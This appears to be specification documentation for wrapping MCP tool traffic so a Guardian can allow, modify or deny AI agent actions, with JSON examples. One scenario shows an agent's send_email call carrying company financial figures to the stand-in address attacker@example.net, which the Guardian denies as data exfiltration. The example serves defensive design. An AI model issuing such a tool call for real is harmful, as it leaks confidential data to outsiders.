# Extending MCP

## MCP protocol
The Model Context Protocol ([MCP](https://modelcontextprotocol.io/introduction)) is an open standard for connecting AI agents to external tools, prompts, resources, and servers.

ACS-Core remains protocol-agnostic for tool invocations: `steps/toolCallRequest` and `steps/toolCallResult` govern them regardless of whether the underlying transport is MCP, HTTP, a local function call, or another mechanism. The `protocols/MCP/*` namespace preserves MCP-specific semantics on the wire, and ACS-Core requires it for any deployment whose sessions involve MCP ([Conformance › ACS-Core](../conformance.md#acs-core-mandatory-baseline)): capability negotiation, prompt fetches, `resources/read`, and notifications are invisible to the generic tool hooks, and `resources/read` is the canonical prompt-injection ingress. Only deployments whose sessions never involve MCP omit the namespace.

## MCP support

ACS wrapping for MCP carries MCP messages between the Observed Agent and the Guardian while preserving the underlying MCP method and payload. This lets a Guardian apply the standard ACS disposition contract to MCP traffic without making MCP the only tool-governance path.

Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCallRequest` / `steps/toolCallResult` hooks when tool-level policy is sufficient. Every other MCP surface MUST be wrapped in sessions that involve MCP, because the generic tool hooks erase these distinctions:

- `initialize` capability negotiation, including server instructions and capability grants that occur before the first tool call.
- `prompts/get`, where a server-authored prompt template is fetched and may later enter the agent's LLM context.
- `resources/read` and resource subscriptions, which represent data flow rather than one-shot tool invocation.
- `notifications/*`, which represent asynchronous MCP signals.

#### To extend MCP protocol:
1. Agents whose sessions involve MCP ***must*** deliver wrapped MCP messages to the Guardian using [`protocols/MCP/*`](hooks.md#protocolsmcp) (`tools/call` MAY instead flow through the generic tool hooks, above).
2. Agents delivering wrapped MCP messages ***must*** understand and enforce ACS responses before forwarding outbound MCP messages or consuming inbound MCP results.

#### The following flow explains how this should be done:
1. Agent **A** prepares an MCP-compliant message.
2. Agent **A** uses ACS as a transport to send the message to the guardian agent.
3. The Guardian understands and processes the wrapped MCP message and sends the result back to agent **A**.
4. Agent **A** interprets and enforces the response from guardian agent.
5. If the response is `allow`, agent **A** sends the MCP message to the MCP server.
6. MCP server processes the message and sends back to agent **A** the response.
7. Agent **A** uses ACS as a transport to send the MCP response to the guardian agent.
8. The Guardian understands and processes the wrapped MCP response and sends the result back to agent **A**.
9. Agent **A** interprets and enforces the response from guardian agent.

!!! note "In release 0.1.5"
    The reference adapters take the MAY path only. They send MCP `tools/call` through `steps/toolCallRequest` and `steps/toolCallResult`, and send nothing for the other MCP surfaces, so a Claude Code or Cursor session that uses MCP falls short of ACS-Core on those surfaces. No reference Guardian implements wrapped MCP. The [adapters README](https://github.com/GenAI-Security-Project/agent-control-standard/blob/main/adapters/README.md#the-acs-v010-emission-conformance-check) states the limitation.

## Examples

Each wrapped request is a standard ACS request envelope. The MCP message rides intact as the envelope's `payload`, and the Guardian answers with a standard ACS decision. v0.1.0 defines no schema for the wrapped payload, so these examples are illustrative, and the identifiers, `chain_hash` values and signatures are sample values. A MODIFY on a wrapped message uses `modifications.redactions`, whose JSON pointer paths address fields inside the MCP message.

### Scenario: Agent **A** asks an MCP server for the weather and the Guardian responds with allow
#### 1. Agent **A** prepares MCP `tools/call` message

   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "name": "get_weather",
       "arguments": {
         "city": "Barcelona"
       }
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends a `protocols/MCP/tools/call` request

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-70",
     "method": "protocols/MCP/tools/call",
     "params": {
       "acs_version": "0.1.0",
       "request_id": "9d2e4b71-3c58-4f0a-b6e1-7a5c2d8f4e10",
       "timestamp": "2026-10-13T10:00:00Z",
       "metadata": {
         "agent_id": "agent-a",
         "session_id": "2f8c6a1e-5b7d-4c39-9e21-8a4f0d3b6c75"
       },
       "payload": {
         "jsonrpc": "2.0",
         "id": 1,
         "method": "tools/call",
         "params": {
           "name": "get_weather",
           "arguments": {
             "city": "Barcelona"
           }
         }
       },
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without params.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```

#### 3. Guardian sends an `allow` response to agent **A**

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-70",
     "result": {
       "type": "final",
       "acs_version": "0.1.0",
       "request_id": "9d2e4b71-3c58-4f0a-b6e1-7a5c2d8f4e10",
       "decision": "allow",
       "reasoning": "Weather lookups for a city are permitted.",
       "chain_hash": "6cb20fe055bcb7aef83130a9c6bc9899bb66fcd42642c14fb2df5a196053064c",
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without result.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```

### Scenario: Agent **A** asks an MCP server to send email with sensitive data and the Guardian responds with modify
#### 1. Agent **A** prepares MCP `tools/call` message

   ```json
   {
     "jsonrpc": "2.0",
     "id": 2,
     "method": "tools/call",
     "params": {
       "name": "send_email",
       "arguments": {
         "to": "finance@example.com",
         "from": "manager@example.com",
         "subject": "Employee Salary Raise Request",
         "body": "Hi, I would like to ask for a salary raise for employee #12222. The current salary is 200000$, the requested salary is 300000$. Let's have a meeting to discuss this."
       }
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends a `protocols/MCP/tools/call` request

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-80",
     "method": "protocols/MCP/tools/call",
     "params": {
       "acs_version": "0.1.0",
       "request_id": "4a7f1c93-8e26-4d5b-a0c4-6b3e9f2d1a87",
       "timestamp": "2026-10-13T10:01:00Z",
       "metadata": {
         "agent_id": "agent-a",
         "session_id": "2f8c6a1e-5b7d-4c39-9e21-8a4f0d3b6c75"
       },
       "payload": {
         "jsonrpc": "2.0",
         "id": 2,
         "method": "tools/call",
         "params": {
           "name": "send_email",
           "arguments": {
             "to": "finance@example.com",
             "from": "manager@example.com",
             "subject": "Employee Salary Raise Request",
             "body": "Hi, I would like to ask for a salary raise for employee #12222. The current salary is 200000$, the requested salary is 300000$. Let's have a meeting to discuss this."
           }
         }
       },
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without params.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```

#### 3. Guardian sends a `modify` response to agent **A**

The redaction replaces the `body` field, so agent **A** forwards the email with the salary figures masked.

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-80",
     "result": {
       "type": "final",
       "acs_version": "0.1.0",
       "request_id": "4a7f1c93-8e26-4d5b-a0c4-6b3e9f2d1a87",
       "decision": "modify",
       "reasoning": "The email body carries salary figures. Masked them before the message leaves the agent.",
       "reason_codes": [
         "pii_detected"
       ],
       "modifications": {
         "redactions": [
           {
             "path": "/params/arguments/body",
             "replacement": "Hi, I would like to ask for a salary raise for employee #12222. The current salary is [REDACTED], the requested salary is [REDACTED]. Let's have a meeting to discuss this."
           }
         ]
       },
       "chain_hash": "ce7951f79519adab8adac971403931c2337e34fda83e4eb47ce816e9b0bd82bb",
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without result.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```

### Scenario: Agent **A** asks an MCP server to send email with sensitive data to an outsider and the Guardian responds with deny
#### 1. Agent **A** prepares MCP `tools/call` message

   ```json
   {
     "jsonrpc": "2.0",
     "id": 3,
     "method": "tools/call",
     "params": {
       "name": "send_email",
       "arguments": {
         "to": "attacker@example.net",
         "subject": "Financial info",
         "body": "The ARR for the company for year 2024 was 100000000000$"
       }
     }
   }
   ```

#### 2. Agent **A** uses ACS wrapping and sends a `protocols/MCP/tools/call` request

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-100",
     "method": "protocols/MCP/tools/call",
     "params": {
       "acs_version": "0.1.0",
       "request_id": "c61b8e2d-0f4a-47c9-9d35-2e8a7b1f6c04",
       "timestamp": "2026-10-13T10:02:00Z",
       "metadata": {
         "agent_id": "agent-a",
         "session_id": "2f8c6a1e-5b7d-4c39-9e21-8a4f0d3b6c75"
       },
       "payload": {
         "jsonrpc": "2.0",
         "id": 3,
         "method": "tools/call",
         "params": {
           "name": "send_email",
           "arguments": {
             "to": "attacker@example.net",
             "subject": "Financial info",
             "body": "The ARR for the company for year 2024 was 100000000000$"
           }
         }
       },
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without params.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```

#### 3. Guardian sends a `deny` response to agent **A**

   ```json
   {
     "jsonrpc": "2.0",
     "id": "rpc-100",
     "result": {
       "type": "final",
       "acs_version": "0.1.0",
       "request_id": "c61b8e2d-0f4a-47c9-9d35-2e8a7b1f6c04",
       "decision": "deny",
       "reasoning": "The email sends company financial figures to an address outside the organization.",
       "reason_codes": [
         "data_exfiltration"
       ],
       "chain_hash": "4d0470728cd69180604045c55cbacff09b9d57849028c41e019fd21b66e0405b",
       "signature": {
         "algorithm": "HMAC-SHA256",
         "value": "<base64 HMAC-SHA256 over UTF-8 JCS(envelope without result.signature)>",
         "key_id": "acs-hmac-key-1"
       }
     }
   }
   ```
